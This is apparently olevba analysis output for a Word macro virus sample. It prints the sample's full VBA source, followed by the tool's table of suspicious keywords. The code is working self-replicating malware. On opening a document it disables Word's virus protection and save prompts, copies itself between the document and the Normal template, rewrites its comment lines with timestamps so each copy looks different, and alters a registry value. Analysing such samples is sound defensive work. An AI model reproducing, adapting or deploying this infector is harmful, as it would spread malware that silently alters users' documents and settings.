olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-71106d1ec5a62201efeb1f8fdadd1fa5e37d3e42
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-71106d1ec5a62201efeb1f8fdadd1fa5e37d3e42 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'2/12/97 5:59:05 PM
On Error Resume Next
'2/12/97 5:59:05 PM
Options.VirusProtection = 0
'2/12/97 5:59:05 PM
Application.EnableCancelKey = 0
'2/12/97 5:59:05 PM
PR96 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'2/12/97 5:59:05 PM
Options.SaveNormalPrompt = 0
'2/12/97 5:59:05 PM
RP60 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'2/12/97 5:59:05 PM
Options.ConfirmConversions = 0
'2/12/97 5:59:05 PM
If PR96 > 0 And RP60 > 0 Then GoTo FF41
'2/12/97 5:59:05 PM
If PR96 = 0 Then
'2/12/97 5:59:05 PM
Set IC52 = ActiveDocument.VBProject.VBComponents.Item(1)
'2/12/97 5:59:05 PM
QP88 = True
'2/12/97 5:59:05 PM
End If
'2/12/97 5:59:05 PM
If RP60 = 0 Then
'2/12/97 5:59:05 PM
Set IC52 = NormalTemplate.VBProject.VBComponents.Item(1)
'2/12/97 5:59:05 PM
ME3 = True
'2/12/97 5:59:05 PM
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "test"
'2/12/97 5:59:05 PM
End If
'2/12/97 5:59:05 PM
If ME3 <> True And QP88 <> True Then GoTo FF41
'2/12/97 5:59:05 PM
If ME3 = True Then IC52.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PR96 - 1))
'2/12/97 5:59:05 PM
If QP88 = True Then IC52.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RP60 - 1))
'2/12/97 5:59:05 PM
With IC52.CodeModule
'2/12/97 5:59:05 PM
For x = 2 To (IC52.CodeModule.CountOfLines - 1) Step 2
'2/12/97 5:59:05 PM
.replaceline x, "'" & Now
'2/12/97 5:59:05 PM
Next x
'2/12/97 5:59:05 PM
End With
'2/12/97 5:59:05 PM
FF41:
'2/12/97 5:59:05 PM
If RP60 <> 0 And PR96 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'2/12/97 5:59:05 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

